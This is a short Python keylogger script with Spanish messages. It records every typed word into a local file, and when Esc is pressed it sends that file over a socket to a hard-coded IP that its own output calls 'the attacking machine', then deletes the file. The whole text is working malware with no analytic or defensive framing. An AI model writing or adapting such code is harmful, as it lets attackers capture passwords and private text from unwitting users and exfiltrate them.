import keyboard as k;import sys as s;import socket as sk;import os as o;from colorama import Fore as F, Style as S

g = F.GREEN; r = S.RESET_ALL

p = ""

def t(e):
    global p
    if e.event_type == k.KEY_DOWN:
        if e.name == 'space':
            g_()
        elif len(e.name) == 1 and e.name.isprintable():
            p += e.name

k.hook(t)

def g_():
    with open("output.txt", "a") as f:
        f.write(p + "\n")
    print(f'Palabra registrada: {g}{p}{r}')
    r_()

def r_():
    global p
    p = ""

def s_(f, d, pr):
    try:
        with open(f, 'rb') as fl:
            c = fl.read()
        with sk.socket(sk.AF_INET, sk.SOCK_STREAM) as sock:
            sock.connect((d, pr))
            sock.sendall(c)
            o.remove(f)
            s.exit()
    except Exception as e:
        print(f"Error al enviar el archivo: {e}")

def d_():
    print("Enviamos datos a la máquina atacante")
    k.unhook_all()
    s_(a, ip, pt)

ip = '192.168.100.177'
pt = 447
a = 'output.txt'

try:
    k.wait('esc')
    d_()
except KeyboardInterrupt:
    print(f'{g}Script Detenido{r}')
    pass
